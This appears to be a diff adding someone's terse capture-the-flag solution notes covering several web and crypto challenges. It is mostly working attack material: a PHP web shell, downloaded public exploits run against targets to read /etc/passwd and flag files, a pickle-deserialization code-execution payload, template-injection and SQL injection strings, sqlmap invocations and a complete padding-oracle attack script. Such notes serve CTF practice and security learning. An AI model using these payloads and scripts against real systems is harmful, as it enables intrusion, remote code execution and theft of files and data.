@@ -1,0 +1,202 @@
+bolt (probably a reverse shell vulnerability)
+http://34.40.24.84:30961/bolt/login
+admin/password
+create html file
+<?php echo system($_GET['cmd']);?>
+rename to php file
+http://34.40.24.84:30961/files/exp.php?cmd=ls-la (should remove bolt part)
+http://34.40.24.84:30961/files/exp.php?cmd=cat%20/flag.txt
+
+elastic
+view source code
+Page has an elasticsearch vulnerability related to arbitrary file reading in versions before 1.6.1 
+searchsploit elasticsearch (in kali linux)
+wget https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py -O exploit_elastic.py
+python3 exploit_elastic.py http://34.107.35.6:31801 /etc/passwd
+
+libssh
+nmap -sV -sC -p 31348 34.107.35.141 -Pn
+https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d
+wget https://gist.githubusercontent.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d/raw/ -O exploit.py
+python3 exploit.py 34.107.35.141 -p 31348 -c "cd ..;cat flag.txt"
+
+php-unit
+git clone https://github.com/maurosoria/dirsearch.git
+cd dirsearch
+python3 dirsearch.py -u 34.159.27.166:32034 -w ./db/dicc.txt
+http://34.159.27.166:32034/composer.json
+/composer.json for version of php
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php for vulnerable path
+<?php system('cat /flag.txt')?> in burp
+
+shark(in burp)
+${7*7}
+curl -I http://34.159.27.166:31978/
+
+name=<% 
+import os
+x=os.popen('cat flag').read() 
+%>
+${x}
+
+nodiff-backdoor(in kali)
+dirsearch -u http://34.159.27.166:32008
+http://34.159.27.166:32008/backup.zip
+grep -r "shell_exec(" in extracted folder
+/home/giobolota/Desktop/backup/wp-content/themes/twentytwentytwo/functions.php
+http://34.107.45.207:30148/?welldone=knockknock&shazam=id
+http://34.107.45.207:30148/?welldone=knockknock&shazam=cat flag.php
+
+schematics
+http://34.40.24.84:31353/register.php
+' OR '1'='1
+afterwards find phpsessid cookie
+in kali:
+sqlmap --cookie="PHPSESSID=837adf29c8df0dac92e6c749a259a1b4" --url="http://34.40.24.84:31353/index.php" --forms --columns
+CTF{1nformat1on_sch3ma_c4n_cont41n_us3ful_d4t4}
+
+
+sweetnsour(in burp)
+curl -I http://34.40.24.84:30860/ (in kali)
+echo -n "gANYCwAAAFRyeSBIYXJkZXIhcQAu" | base64 -d
+payload:
+from base64 import b64encode
+import subprocess
+import pickle
+import os
+class anti_pickle_serum(object):
+    def __reduce__(self):
+        return subprocess.check_output, (['cat', 'flag'], )
+
+pickled = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
+endodedPickled = b64encode(pickled)
+print(endodedPickled)
+
+replace old cookie with new in burp:
+KGRwMApWc2VydW0KcDEKY2NvbW1hbmRzCmNoZWNrX291dHB1dApwMgooKGxwMwpWY2F0CnA0CmFWZmxhZwpwNQphdHA2ClJwNwpzLg==
+
+
+online-encryption
+find requests 8560 and 8541
+find input value and copy as base64
+base64 decode
+rot13 decode
+
+
+authorization
+git clone https://github.com/maurosoria/dirsearch.git
+cd dirsearch
+python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+python3 dirsearch.py -u http://34.40.24.84:31586/ -w db/dicc.txt
+
+curl -s -X POST http://34.40.24.84:30653/auth  -H "Content-Type: application/json"  -d username":"admin", "password":"admin"}'
+ 
+curl -s http://34.40.24.84:30653/secrets -H "Content-Type: application/json"  -H "Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTE4MjA3MDIsImlhdCI6MTc1MTgyMDQwMiwibmJmIjoxNzUxODIwNDAyLCJpZGVudGl0eSI6MX0.Trfufbir_5KAGSf6D-IROWIhGD5vGMvyv0YTiZBPurQ"
+
+
+seer
+1.	nmap -sV -sC -p 32315 34.40.24.84 -Pn
+2.	nc 34.40.24.84 32315
+3.	python3 -c 'print("2\n" + "A"*16)' | nc 34.40.24.84 32315
+4.	echo "n1UATBhSfzoPdHk8Q8AR+COaYYoYxwi8bchITKHri7gVKSZKDzK2egexApBXOvh/hvPmCSw833Y+ol33ESmGW7xf5HcHlHm5Un+GDxF1+ksLB1xfg7X7TQLbFCc4bgS5" | base64 -d | xxd
+5.	setup python environment run following script 
+
+import socket
+from base64 import b64decode, b64encode
+from Crypto.Util.Padding import pad, unpad
+import time
+import hashlib
+
+def send_message(ciphertext):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('34.40.24.84', 32315))
+    
+    # Read welcome message
+    s.recv(1024)
+    
+    # Select option 2 (send feedback)
+    s.send(b'2\n')
+    s.recv(1024)  # Read prompt
+    
+    # Send our ciphertext
+    s.send(b64encode(ciphertext) + b'\n')
+    response = s.recv(1024)
+    s.close()
+    
+    # Adjust this condition based on actual server responses
+    return b'ValueError: Incorrect IV length' not in response
+
+def padding_oracle_attack(ciphertext, block_size=16):
+    iv = ciphertext[:block_size]
+    blocks = [ciphertext[i:i+block_size] for i in range(block_size, len(ciphertext), block_size)]
+    plaintext = b''
+    
+    for block_num, block in enumerate(blocks):
+        print(f"\nDecrypting block {block_num + 1}/{len(blocks)}")
+        intermediate = bytearray(block_size)
+        plain_block = bytearray(block_size)
+        
+        prev_block = iv if block_num == 0 else blocks[block_num - 1]
+        
+        for byte_pos in range(block_size-1, -1, -1):
+            padding_value = block_size - byte_pos
+            
+            for guess in range(256):
+                modified_prev = bytearray(prev_block)
+                
+                # Set bytes we already know
+                for k in range(byte_pos + 1, block_size):
+                    modified_prev[k] = intermediate[k] ^ padding_value
+                
+                modified_prev[byte_pos] = guess
+                test_cipher = bytes(modified_prev) + block
+                
+                valid = send_message(test_cipher)
+                time.sleep(0.1)  # Rate limiting
+                
+                if valid:
+                    intermediate[byte_pos] = guess ^ padding_value
+                    plain_block[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
+                    print(f"Byte {byte_pos}: {plain_block[byte_pos]:02x}", end=' ', flush=True)
+                    break
+        
+        plaintext += bytes(plain_block)
+        print(f"\nPartial plaintext: {plaintext.decode(errors='ignore')}")
+    
+    try:
+        return unpad(plaintext, block_size).decode()
+    except:
+        return plaintext.decode(errors='ignore')
+
+# The encrypted message you received from option 1
+encrypted_b64 = '5N9BWwOEjNOBH5C9Rnal5YqO/1A7tyq0jpoNDFcR4DrZ8kusJPq+WUiXnGiSAI9wY7OFOoj5H0kBYqrNskW7z7FPC8VeiJp+wM6toYJ3sU8AE3Q7Qiz3MYrgSW++wliS'
+encrypted = b64decode(encrypted_b64)
+
+print("Starting padding oracle attack...")
+decrypted = padding_oracle_attack(encrypted)
+
+print("\nFully decrypted message:")
+print(decrypted)
+
+flag = "CTF{" + hashlib.sha256(decrypted.encode()).hexdigest() + "}"
+print("\nFlag:", flag)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
